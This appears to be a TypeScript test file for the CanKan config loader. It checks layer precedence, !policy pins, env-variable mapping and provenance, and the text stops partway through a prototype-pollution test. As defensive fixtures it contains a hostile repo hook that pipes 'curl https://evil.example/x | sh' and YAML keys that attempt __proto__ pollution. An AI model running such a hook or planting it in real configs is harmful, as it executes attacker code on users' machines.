import { join } from "node:path";
import { describe, expect, test } from "bun:test";
import { withEnv } from "../../../test-utils/src/withEnv";
import { loadConfig } from "../../src/config/index";
import type { ResolvedEntry } from "../../src/config/index";
import { flattenLeaves, isSafeSegment, setPath } from "../../src/config/resolve";
import { isCanKanError } from "../../src/errors";
import {
  hermeticEnv,
  makeTempRepoRoot,
  withoutCankanEnv,
  writeGlobalConfigFile,
  writeRepoConfigFile,
} from "./testHelpers";

describe("LoadConfigOptions.env defaults to process.env", () => {
  // Every other test in this suite passes an explicit, hermetic `env` (see
  // `hermeticEnv` in testHelpers.ts) so a stray `CANKAN_*` var in the
  // operator's own shell or CI can't change a resolution result out from
  // under an assertion. This is the one deliberate exception, covering the
  // default itself -- `withEnv` keeps HOME/XDG_CONFIG_HOME pointed at a
  // temp dir, but (review round 2 finding 8) it does **not** touch
  // `CANKAN_*` at all, so a bare `loadConfig({})` here still reads
  // whichever real `CANKAN_*` vars the process actually has. That is the
  // risk this test's own leakage comes from -- not `~/.config` (already
  // closed by `withEnv`) -- so `withoutCankanEnv` scrubs it for this
  // test's duration the same way `withEnv` scrubs XDG vars.
  test("omitting `env` reads process.env, which withEnv has pointed at a temp HOME", async () => {
    await withEnv(undefined, async () => {
      await withoutCankanEnv(async () => {
        const home = process.env.HOME as string;
        await writeGlobalConfigFile(join(home, ".config"), "editor: vim\n");
        const result = await loadConfig({});
        expect(result.resolved("editor")?.value).toBe("vim");
      });
    });
  });
});

// ---------------------------------------------------------------------------
// PLAN.md's three named tests -- the floor.
// ---------------------------------------------------------------------------

describe("PLAN.md's three floor tests", () => {
  test("1. a preference key overridden by local config", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "claims:\n  lease: 4h\n");
        await writeRepoConfigFile(root, "local.yml", "claims:\n  lease: 1h\n");
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.claims.lease).toBe("1h");
        expect(result.resolved("claims.lease")?.layer).toBe("repo-local");
      } finally {
        await cleanup();
      }
    });
  });

  test("2. a policy key NOT overridden by env", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "claims:\n  max_per_actor: 3\n");
        const result = await loadConfig({
          repoRoot: root,
          env: hermeticEnv({ CANKAN_CLAIMS__MAX_PER_ACTOR: "999" }),
        });
        expect(result.value.claims.max_per_actor).toBe(3);
        expect(result.resolved("claims.max_per_actor")?.layer).toBe("repo");
      } finally {
        await cleanup();
      }
    });
  });

  test("3. a !policy pin raises POLICY_VIOLATION with the pinning file named in details", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const repoPath = await writeRepoConfigFile(root, "config.yml", "sync: !policy\n  auto_push: all\n");
        await writeRepoConfigFile(root, "local.yml", "sync:\n  auto_push: off\n");
        let thrown: unknown;
        try {
          await loadConfig({ repoRoot: root, env: hermeticEnv() });
        } catch (err) {
          thrown = err;
        }
        expect(isCanKanError(thrown)).toBe(true);
        const err = thrown as InstanceType<typeof Error> & {
          code: string;
          details?: Record<string, unknown>;
        };
        expect(err.code).toBe("POLICY_VIOLATION");
        expect(err.message).toContain(".cankan/config.yml");
        expect(err.details?.key).toBe("sync.auto_push");
        expect(err.details?.pinnedBy).toBe(repoPath);
      } finally {
        await cleanup();
      }
    });
  });
});

// ---------------------------------------------------------------------------
// Full precedence table.
// ---------------------------------------------------------------------------

describe("full precedence table", () => {
  test("preference key: each of the five rungs wins in turn as higher rungs are removed", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const home = process.env.HOME as string;

        // All five layers set claims.lease.
        await writeGlobalConfigFile(join(home, ".config"), "claims:\n  lease: 5h\n");
        await writeRepoConfigFile(root, "config.yml", "claims:\n  lease: 4h\n");
        await writeRepoConfigFile(root, "local.yml", "claims:\n  lease: 3h\n");
        let result = await loadConfig({
          repoRoot: root,
          env: hermeticEnv({ CANKAN_CLAIMS__LEASE: "1h" }),
        });
        expect(result.value.claims.lease).toBe("1h");
        expect(result.resolved("claims.lease")?.layer).toBe("env");

        // Remove env -> repo-local wins.
        result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.claims.lease).toBe("3h");
        expect(result.resolved("claims.lease")?.layer).toBe("repo-local");

        // Remove repo-local -> repo wins.
        await writeRepoConfigFile(root, "local.yml", "\n");
        result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.claims.lease).toBe("4h");
        expect(result.resolved("claims.lease")?.layer).toBe("repo");

        // Remove repo -> global wins.
        await writeRepoConfigFile(root, "config.yml", "\n");
        result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.claims.lease).toBe("5h");
        expect(result.resolved("claims.lease")?.layer).toBe("global");

        // Remove global -> default wins.
        await writeGlobalConfigFile(join(home, ".config"), "\n");
        result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.claims.lease).toBe("2h");
        expect(result.resolved("claims.lease")?.layer).toBe("default");
      } finally {
        await cleanup();
      }
    });
  });

  test("policy key: four rungs, and env is demonstrably absent from the chain", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const home = process.env.HOME as string;

        await writeGlobalConfigFile(join(home, ".config"), "claims:\n  max_per_actor: 5\n");
        await writeRepoConfigFile(root, "config.yml", "claims:\n  max_per_actor: 4\n");
        await writeRepoConfigFile(root, "local.yml", "claims:\n  max_per_actor: 3\n");

        // env set too -- must be ignored throughout, never an error.
        const env = hermeticEnv({ CANKAN_CLAIMS__MAX_PER_ACTOR: "999" });

        let result = await loadConfig({ repoRoot: root, env });
        expect(result.value.claims.max_per_actor).toBe(4);
        expect(result.resolved("claims.max_per_actor")?.layer).toBe("repo");

        await writeRepoConfigFile(root, "config.yml", "\n");
        result = await loadConfig({ repoRoot: root, env });
        expect(result.value.claims.max_per_actor).toBe(3);
        expect(result.resolved("claims.max_per_actor")?.layer).toBe("repo-local");

        await writeRepoConfigFile(root, "local.yml", "\n");
        result = await loadConfig({ repoRoot: root, env });
        expect(result.value.claims.max_per_actor).toBe(5);
        expect(result.resolved("claims.max_per_actor")?.layer).toBe("global");

        await writeGlobalConfigFile(join(home, ".config"), "\n");
        result = await loadConfig({ repoRoot: root, env });
        expect(result.value.claims.max_per_actor).toBe(3); // built-in default
        expect(result.resolved("claims.max_per_actor")?.layer).toBe("default");
      } finally {
        await cleanup();
      }
    });
  });
});

// ---------------------------------------------------------------------------
// Source attribution correctness for each rung.
// ---------------------------------------------------------------------------

describe("source attribution", () => {
  test("resolved(key).layer and .file for each rung; file absent for env/default; envVar set for env", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const home = process.env.HOME as string;
        const globalPath = await writeGlobalConfigFile(join(home, ".config"), "editor: vim\n");
        const repoPath = await writeRepoConfigFile(root, "config.yml", "project: repo-project\n");
        const localPath = await writeRepoConfigFile(root, "local.yml", "actor: alice\n");

        const result = await loadConfig({
          repoRoot: root,
          env: hermeticEnv({ CANKAN_PARENT: "ck-1" }),
        });

        const globalEntry = result.resolved("editor");
        expect(globalEntry).toEqual({
          path: ["editor"],
          key: "editor",
          value: "vim",
          layer: "global",
          file: globalPath,
        });

        const repoEntry = result.resolved("project");
        expect(repoEntry).toEqual({
          path: ["project"],
          key: "project",
          value: "repo-project",
          layer: "repo",
          file: repoPath,
        });

        const localEntry = result.resolved("actor");
        expect(localEntry).toEqual({
          path: ["actor"],
          key: "actor",
          value: "alice",
          layer: "repo-local",
          file: localPath,
        });

        const envEntry = result.resolved("parent");
        expect(envEntry).toEqual({
          path: ["parent"],
          key: "parent",
          value: "ck-1",
          layer: "env",
          envVar: "CANKAN_PARENT",
        });
        expect(envEntry?.file).toBeUndefined();

        const defaultEntry = result.resolved("tickets_dir");
        expect(defaultEntry).toEqual({
          path: ["tickets_dir"],
          key: "tickets_dir",
          value: "backlog/tasks",
          layer: "default",
        });
        expect(defaultEntry?.file).toBeUndefined();

        // AMENDMENT A1: the array form is the unambiguous lookup.
        expect(result.resolved(["editor"])).toEqual(globalEntry);
        expect(result.resolved(["parent"])).toEqual(envEntry);
      } finally {
        await cleanup();
      }
    });
  });
});

// ---------------------------------------------------------------------------
// entries()
// ---------------------------------------------------------------------------

describe("resolved() for a key with no effective value anywhere", () => {
  test("returns undefined, and the key is absent from entries()", async () => {
    await withEnv(undefined, async () => {
      const result = await loadConfig({ env: hermeticEnv() });
      // `id_prefix` has no built-in default and nothing set it.
      expect(result.resolved("id_prefix")).toBeUndefined();
      expect(result.entries().some((e) => e.key === "id_prefix")).toBe(false);
      expect(result.value.id_prefix).toBeUndefined();
    });
  });
});

describe("AMENDMENT A1 rule 3 — a rendered-key collision between two distinct paths (review round 2 finding 4)", () => {
  test("string-form resolved() returns whichever collision entry appears first in entries() order; array form disambiguates both", async () => {
    // Two genuinely distinct paths that render to the identical dotted
    // string "backers.gh.status_map.type":
    //   P1 = ["backers", "gh.status_map", "type"]   -- a backer literally
    //        named "gh.status_map" (a dot inside one segment)
    //   P2 = ["backers", "gh", "status_map", "type"] -- a backer named "gh"
    //        whose own status_map has an (empty-object) entry keyed "type"
    // Documented in AMENDMENT A1's ResolvedEntry.resolved() JSDoc, never
    // exercised until now.
    await withEnv(undefined, async () => {
      const home = process.env.HOME as string;
      await writeGlobalConfigFile(
        join(home, ".config"),
        [
          "backers:",
          '  "gh.status_map":',
          "    type: github",
          "  gh:",
          "    type: github",
          "    status_map:",
          "      type: {}",
          "",
        ].join("\n"),
      );
      const result = await loadConfig({ env: hermeticEnv() });

      const collisionKey = "backers.gh.status_map.type";
      const collisionEntries = result.entries().filter((e) => e.key === collisionKey);
      expect(collisionEntries).toHaveLength(2);

      // The two really are distinct paths -- a genuine collision, not a
      // duplicate.
      const paths = collisionEntries.map((e) => e.path);
      expect(paths).toContainEqual(["backers", "gh.status_map", "type"]);
      expect(paths).toContainEqual(["backers", "gh", "status_map", "type"]);

      // String form: whichever collision entry appears first in entries()'s
      // own overall order wins -- deterministic and documented, not an
      // arbitrary or unstable pick. Reference-equal to entries()'s own
      // object, not just value-equal.
      expect(result.resolved(collisionKey)).toBe(collisionEntries[0]);

      // Array form is the escape hatch A1 exists to provide: each path is
      // independently addressable regardless of the string-level collision.
      expect(result.resolved(["backers", "gh.status_map", "type"])?.value).toBe("github");
      expect(result.resolved(["backers", "gh", "status_map", "type"])?.value).toEqual({});
    });
  });
});

describe("entries()", () => {
  test("enumerates every effective key and is sorted", async () => {
    await withEnv(undefined, async () => {
      const result = await loadConfig({ env: hermeticEnv() });
      const entries = result.entries();
      expect(entries.length).toBeGreaterThan(0);
      const keys = entries.map((e) => e.key);
      const sorted = [...keys].sort((a, b) => (a < b ? -1 : a > b ? 1 : 0));
      expect(keys).toEqual(sorted);
      expect(keys).toContain("tickets_dir");
      expect(keys).toContain("claims.lease");
      // Every key claims.lease is present exactly once.
      expect(keys.filter((k) => k === "claims.lease")).toHaveLength(1);
    });
  });

  test("returns a frozen array, so a caller can't corrupt later calls (review round 2 finding 11)", async () => {
    await withEnv(undefined, async () => {
      const result = await loadConfig({ env: hermeticEnv() });
      const entries = result.entries();
      expect(Object.isFrozen(entries)).toBe(true);
      expect(() => {
        (entries as unknown as ResolvedEntry[]).push({
          path: ["x"],
          key: "x",
          value: 1,
          layer: "default",
        });
      }).toThrow();
      // The same reference comes back every time (matches `layers`, which
      // is also frozen and stable across calls).
      expect(result.entries()).toBe(entries);
    });
  });

  test("dynamic map entries (backers/queues/hooks) appear per-leaf", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(
          root,
          "config.yml",
          "backers:\n  github:\n    repo: owner/name\nhooks:\n  on_claim: echo hi\n",
        );
        const home = process.env.HOME as string;
        await writeGlobalConfigFile(join(home, ".config"), "backers:\n  jira-work:\n    type: jira\n    credential: jira-cred\n");

        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        const keys = result.entries().map((e) => e.key);
        expect(keys).toContain("backers.github.repo");
        expect(keys).toContain("hooks.on_claim");
        expect(keys).toContain("backers.jira-work.credential");
        expect(keys).toContain("backers.jira-work.type");
      } finally {
        await cleanup();
      }
    });
  });

  test("a present-but-empty map entry survives (does not silently vanish from `value`)", async () => {
    // `flattenLeaves` only records a dotted path where it finds an actual
    // leaf value; a genuinely empty map entry (`queues: { urgent: {} }` --
    // a legal, empty `queueEntrySchema`) has no leaves beneath it at all,
    // so a naive implementation records nothing for it and it disappears
    // from `value` entirely, even though `{}` is valid, present data.
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "queues:\n  urgent: {}\n");
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.queues?.urgent).toEqual({});
      } finally {
        await cleanup();
      }
    });
  });

  test("an empty map entry in one layer does not clobber a more specific leaf from another layer, in either iteration order", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const home = process.env.HOME as string;
        // repo declares the backer entry (as `{}`, no fields yet); global
        // fills in a field on the *same* entry name. Neither file alone
        // determines final iteration order of the underlying Set, so the
        // merge must be order-independent.
        await writeRepoConfigFile(root, "config.yml", "backers:\n  github: {}\n");
        await writeGlobalConfigFile(
          join(home, ".config"),
          "backers:\n  github:\n    type: github\n    credential: cred1\n",
        );
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.backers?.github).toEqual({ type: "github", credential: "cred1" });
      } finally {
        await cleanup();
      }
    });
  });

  test("no phantom intermediate-key entry: entries() carries only the specific leaves, not backers.github itself (review round 2 finding 6)", async () => {
    // Same fixture as the previous test; before the finding-6 fix,
    // entries() carried BOTH the phantom "backers.github" entry (value
    // `{}`, attributed to repo, since repo is the one that merely declared
    // the empty entry) AND the real "backers.github.type" /
    // "backers.github.credential" leaves from global -- misleading for
    // `cankan config show --resolved` / `doctor`, which print exactly this.
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const home = process.env.HOME as string;
        await writeRepoConfigFile(root, "config.yml", "backers:\n  github: {}\n");
        await writeGlobalConfigFile(
          join(home, ".config"),
          "backers:\n  github:\n    type: github\n    credential: cred1\n",
        );
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        const keys = result.entries().map((e) => e.key);
        expect(keys).toContain("backers.github.type");
        expect(keys).toContain("backers.github.credential");
        expect(keys).not.toContain("backers.github");
        expect(result.resolved(["backers", "github"])).toBeUndefined();
      } finally {
        await cleanup();
      }
    });
  });

  test("an empty map entry never forges provenance into another layer's LoadedLayer.data (review round 2 finding 5)", async () => {
    // Reproduced by security review: the user's global config declares
    // `hooks: {}`; a hostile repo declares `hooks: { post_close: <a
    // command> }`. Before the fix, the merge's intermediate-container
    // step reused global's own (shallow-frozen-at-best) `{}` object as a
    // mutable container and wrote the repo's hook command directly into
    // it -- so `layers[global].data.hooks` came back containing the
    // repo's command, even though the file on disk never changed.
    // Contract §1 exposes `layers` *precisely* so a consumer (M2.16) can
    // reason about which file a hook came from; this defeated that.
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const home = process.env.HOME as string;
        await writeGlobalConfigFile(join(home, ".config"), "hooks: {}\n");
        await writeRepoConfigFile(
          root,
          "config.yml",
          'hooks:\n  post_close: "curl https://evil.example/x | sh"\n',
        );
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });

        const globalLayer = result.layers.find((l) => l.layer === "global");
        expect(globalLayer?.data.hooks).toEqual({});
        expect(Object.isFrozen(globalLayer?.data)).toBe(true);
        expect(Object.isFrozen(globalLayer?.data.hooks)).toBe(true);

        // The merge itself still correctly picks up the repo's hook --
        // this fix is about provenance/isolation, not about losing data.
        expect(result.value.hooks?.post_close).toBe("curl https://evil.example/x | sh");

        // The reverse direction: mutating the returned data must fail
        // closed (throw), not silently succeed.
        const hooks = globalLayer?.data.hooks as Record<string, unknown>;
        expect(() => {
          hooks.post_close = "mutated";
        }).toThrow();
      } finally {
        await cleanup();
      }
    });
  });
});

// ---------------------------------------------------------------------------
// !policy on all three node kinds.
// ---------------------------------------------------------------------------

describe("!policy on scalar, sequence, and map nodes (R6)", () => {
  test("scalar", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "sync:\n  auto_push: !policy all\n");
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.sync.auto_push).toBe("all");
        expect(result.resolved("sync.auto_push")?.pinnedBy).toBeDefined();
      } finally {
        await cleanup();
      }
    });
  });

  test("sequence", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", 'ready:\n  order: !policy [rank, "priority:desc"]\n');
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.ready.order).toEqual(["rank", "priority:desc"]);
        expect(result.resolved("ready.order")?.pinnedBy).toBeDefined();
      } finally {
        await cleanup();
      }
    });
  });

  test("map", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "sync: !policy\n  auto_push: transitions_only\n  auto_pull: on_prime\n");
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.sync.auto_push).toBe("transitions_only");
        expect(result.value.sync.auto_pull).toBe("on_prime");
        expect(result.resolved("sync.auto_push")?.pinnedBy).toBeDefined();
        // The tag applies to the tagged node AND every leaf beneath it,
        // including one repo never actually set (falls through to the
        // built-in default, but is still marked pinned).
        expect(result.resolved("sync.conflict_policy")?.pinnedBy).toBeDefined();
        expect(result.resolved("sync.conflict_policy")?.layer).toBe("default");
      } finally {
        await cleanup();
      }
    });
  });

  test("registering the tag does not change the YAML schema version (S3): plain off stays a string", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "sync:\n  auto_push: !policy off\n");
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.sync.auto_push).toBe("off");
      } finally {
        await cleanup();
      }
    });
  });

  test("S3, the literal ask: an UNTAGGED sync.auto_push: off still parses as the string \"off\" once the !policy tag is registered", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        // No !policy anywhere in this file -- registering customTags for
        // the repo layer's parse (unconditionally, for every repo config
        // load) must not itself booleanize a plain, untagged `off`.
        await writeRepoConfigFile(root, "config.yml", "sync:\n  auto_push: off\n");
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.sync.auto_push).toBe("off");
        expect(typeof result.value.sync.auto_push).toBe("string");
      } finally {
        await cleanup();
      }
    });
  });
});

describe("!policy in local/global is a load error naming that file (R6, S4)", () => {
  test("in .cankan/local.yml", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const localPath = await writeRepoConfigFile(root, "local.yml", "editor: !policy vim\n");
        let thrown: unknown;
        try {
          await loadConfig({ repoRoot: root, env: hermeticEnv() });
        } catch (err) {
          thrown = err;
        }
        expect(isCanKanError(thrown)).toBe(true);
        expect((thrown as Error).message).toContain(localPath);
      } finally {
        await cleanup();
      }
    });
  });

  test("in the global config", async () => {
    await withEnv(undefined, async () => {
      const home = process.env.HOME as string;
      const globalPath = await writeGlobalConfigFile(join(home, ".config"), "editor: !policy vim\n");
      let thrown: unknown;
      try {
        await loadConfig({ env: hermeticEnv() });
      } catch (err) {
        thrown = err;
      }
      expect(isCanKanError(thrown)).toBe(true);
      expect((thrown as Error).message).toContain(globalPath);
    });
  });

  test("smuggled through a YAML alias in local.yml (S4)", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const localPath = await writeRepoConfigFile(
          root,
          "local.yml",
          "agents:\n  default_tool: &pinned !policy custom-tool\neditor: *pinned\n",
        );
        let thrown: unknown;
        try {
          await loadConfig({ repoRoot: root, env: hermeticEnv() });
        } catch (err) {
          thrown = err;
        }
        expect(isCanKanError(thrown)).toBe(true);
        expect((thrown as Error).message).toContain(localPath);
      } finally {
        await cleanup();
      }
    });
  });

  test("a !policy tag on the document root is a load error naming the file, not pin-everything (review round 2 finding 7)", async () => {
    // Before the fix, `findPolicyTaggedPaths` built a path from `Pair`
    // ancestors only, so a document-root tag produced a pinned root of ""
    // -- which `findPinnedRoot` could never match against any real key.
    // The tag silently pinned nothing: a local.yml override of a nested
    // key then won with no error, even though the repo author's evident
    // intent was to pin the whole file. Ruling: reject outright (a
    // silently-broken security control is worse than an upfront
    // rejection, and this fails open for the repo -- the attacker in this
    // threat model -- so a load error costs nothing); do NOT pin
    // everything, since that would also silently pin fields (e.g.
    // `version`) the author never named.
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const repoPath = await writeRepoConfigFile(
          root,
          "config.yml",
          "!policy\nproject: p\nsync:\n  auto_push: all\n",
        );
        let thrown: unknown;
        try {
          await loadConfig({ repoRoot: root, env: hermeticEnv() });
        } catch (err) {
          thrown = err;
        }
        expect(isCanKanError(thrown)).toBe(true);
        const err = thrown as InstanceType<typeof Error> & { code: string };
        expect(err.code).toBe("INVALID_CONFIG");
        expect(err.message).toContain(repoPath);
        expect(err.message).toContain("document root");
      } finally {
        await cleanup();
      }
    });
  });
});

// ---------------------------------------------------------------------------
// Non-violations.
// ---------------------------------------------------------------------------

describe("non-violations that an implementation naturally gets wrong (R7)", () => {
  test("a global config setting a built-in policy key (no pin) is legal and silently overridden", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "project: p\n"); // no columns pin
        const home = process.env.HOME as string;
        await writeGlobalConfigFile(join(home, ".config"), 'columns: ["A", "B"]\n');

        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.columns).toEqual(["A", "B"]);
        expect(result.resolved("columns")?.layer).toBe("global");
      } finally {
        await cleanup();
      }
    });
  });

  test("env on a policy key is silently ignored: resolved value is the repo's, no error", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", 'columns: ["Repo A", "Repo B"]\n');
        const result = await loadConfig({
          repoRoot: root,
          env: hermeticEnv({ CANKAN_COLUMNS: '["Env A"]' }),
        });
        expect(result.value.columns).toEqual(["Repo A", "Repo B"]);
        expect(result.resolved("columns")?.layer).toBe("repo");
      } finally {
        await cleanup();
      }
    });
  });

  test("env on a !policy-pinned key is silently ignored, not an error", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "sync: !policy\n  auto_push: all\n");
        const result = await loadConfig({
          repoRoot: root,
          env: hermeticEnv({ CANKAN_SYNC__AUTO_PUSH: "off" }),
        });
        expect(result.value.sync.auto_push).toBe("all");
        expect(result.resolved("sync.auto_push")?.layer).toBe("repo");
      } finally {
        await cleanup();
      }
    });
  });

  test("S4: env cannot be used to make an attempted override appear satisfied when a real violation exists", async () => {
    // R7(b) (env silently ignored) and R7 (an actual local/global override
    // of a pinned key is eager and fatal) must not be the same code path in
    // a way that lets a stray env var short-circuit the violation check.
    // The env var here even matches the *repo's own pinned value* -- if the
    // implementation mistakenly treated "env agrees with the pin" as
    // satisfying the pin, this would pass with no error, which is wrong.
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "sync: !policy\n  auto_push: all\n");
        await writeRepoConfigFile(root, "local.yml", "sync:\n  auto_push: off\n");
        let thrown: unknown;
        try {
          await loadConfig({
            repoRoot: root,
            env: hermeticEnv({ CANKAN_SYNC__AUTO_PUSH: "all" }),
          });
        } catch (err) {
          thrown = err;
        }
        expect(isCanKanError(thrown)).toBe(true);
        expect((thrown as InstanceType<typeof Error> & { code: string }).code).toBe(
          "POLICY_VIOLATION",
        );
      } finally {
        await cleanup();
      }
    });
  });
});

// ---------------------------------------------------------------------------
// Env mapping and coercion (R8-R10).
// ---------------------------------------------------------------------------

describe("env mapping (R8)", () => {
  test("CANKAN_ACTOR -> actor (the fixed point)", async () => {
    await withEnv(undefined, async () => {
      const result = await loadConfig({ env: hermeticEnv({ CANKAN_ACTOR: "bob" }) });
      expect(result.value.actor).toBe("bob");
      expect(result.resolved("actor")).toEqual({
        path: ["actor"],
        key: "actor",
        value: "bob",
        layer: "env",
        envVar: "CANKAN_ACTOR",
      });
    });
  });

  test("CANKAN_CLAIMS__LEASE -> claims.lease", async () => {
    await withEnv(undefined, async () => {
      const result = await loadConfig({ env: hermeticEnv({ CANKAN_CLAIMS__LEASE: "9h" }) });
      expect(result.value.claims.lease).toBe("9h");
    });
  });

  test("a CANKAN_* var that maps to no schema key is ignored", async () => {
    await withEnv(undefined, async () => {
      const result = await loadConfig({ env: hermeticEnv({ CANKAN_NOT_A_REAL_KEY: "x" }) });
      expect(result.entries().some((e) => e.key.includes("not_a_real_key"))).toBe(false);
    });
  });

  test("CANKAN_GITHUB_TOKEN is ignored and never appears in entries()", async () => {
    await withEnv(undefined, async () => {
      const result = await loadConfig({ env: hermeticEnv({ CANKAN_GITHUB_TOKEN: "sekrit-token" }) });
      const entries = result.entries();
      expect(entries.some((e) => e.key.toLowerCase().includes("token"))).toBe(false);
      expect(entries.some((e) => JSON.stringify(e.value).includes("sekrit-token"))).toBe(false);
    });
  });
});

describe("S5 -- env may reach the global-only sections (a ruling, not a bug)", () => {
  test("CANKAN_PERSONAL__REMOTE sets what a repo file cannot", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        // A repo file cannot even parse `personal.*` (schema.ts scopes it
        // to global-only) -- proven separately by schema.test.ts. Env is
        // not subject to that per-file scoping.
        await writeRepoConfigFile(root, "config.yml", "project: p\n");
        const result = await loadConfig({
          repoRoot: root,
          env: hermeticEnv({ CANKAN_PERSONAL__REMOTE: "git@example.com:me/personal.git" }),
        });
        expect(result.value.personal?.remote).toBe("git@example.com:me/personal.git");
        expect(result.resolved("personal.remote")?.layer).toBe("env");
      } finally {
        await cleanup();
      }
    });
  });
});

describe("env coercion (R9)", () => {
  test("a numeric key set from a string coerces", async () => {
    // `version` is unclassified -> preference by default (R2), and numeric
    // -- unlike `claims.max_per_actor`, which is a *policy* key and so has
    // no env rung at all (R7(b), covered separately above).
    await withEnv(undefined, async () => {
      const result = await loadConfig({ env: hermeticEnv({ CANKAN_VERSION: "7" }) });
      expect(result.value.version).toBe(7);
      expect(typeof result.value.version).toBe("number");
    });
  });

  test("an invalid value is a load error naming the variable and the key", async () => {
    await withEnv(undefined, async () => {
      let thrown: unknown;
      try {
        await loadConfig({ env: hermeticEnv({ CANKAN_CLAIMS__LEASE: "not-a-duration" }) });
      } catch (err) {
        thrown = err;
      }
      expect(isCanKanError(thrown)).toBe(true);
      const message = (thrown as Error).message;
      expect(message).toContain("CANKAN_CLAIMS__LEASE");
      expect(message).toContain("claims.lease");
      // Final review round, finding 3: correct by construction today (the
      // message template never interpolates the raw value), but nothing
      // stops a future edit from adding it "for debuggability" -- which
      // would leak whatever a CANKAN_* var actually held, including a
      // credential set through the env channel. Locking this in as an
      // explicit assertion rather than leaving it merely true by omission.
      expect(message).not.toContain("not-a-duration");
    });
  });
});

// ---------------------------------------------------------------------------
// S1 -- the prototype-pollution guard.
// ---------------------------------------------------------------------------

describe("the dotted-path rebuild rejects __proto__/constructor/prototype segments (S1)", () => {
  // Review round 2 finding 9: the end-to-end test below (unchanged from
  // before) shows the *observable behavior* is correct, but a reviewer
  // proved it does not, on its own, demonstrate that THIS GUARD is what
  // produces that behavior. Replaying the same fixture through a faithful
  // reimplementation of flattenLeaves/setPath with FORBIDDEN_SEGMENTS fully
  // removed still passed, because two things independent of this guard
  // already fail closed:
  // - `__proto__` never reaches `flattenLeaves` at all for data that came
  //   through a real config file -- `zod`'s `z.record(...)` strips an own
  //   `__proto__` key during schema validation, before `flattenLeaves` ever
  //   runs.
  // - `constructor`/`prototype` do survive validation as ordinary own
  //   string-valued properties, but `setPath`'s `Object.create(null)`
  //   intermediate containers make reading/writing those names inert --
  //   there is no prototype chain there for them to reach into.
  // So this end-to-end test is kept (the behavior it checks is real and
  // worth locking in) but is no longer described as proof that the guard
  // itself is load-bearing -- that claim now lives in the white-box tests
  // below, which exercise `setPath`/`isSafeSegment` directly and would
  // genuinely fail without them.
  test("hooks.__proto__.pwned and a constructor variant leave Object.prototype untouched (end-to-end; see the white-box tests below for what actually proves the guard matters)", async () => {
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        // status_map's value type is z.unknown() -- opaque, so arbitrary
        // nested keys survive schema validation into layer data, exactly
        // the shape the merge step must defend on its own.
        await writeRepoConfigFile(
          root,
          "config.yml",
          [
            "backers:",
            "  github:",
            "    status_map:",
            "      todo:",
            "        label: Ready",
            "        __proto__:",
            "          pwned: true",
            "        constructor:",
            "          prototype:",
            "            polluted: true",
            "",
          ].join("\n"),
        );

        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });

        expect((Object.prototype as Record<string, unknown>).pwned).toBeUndefined();
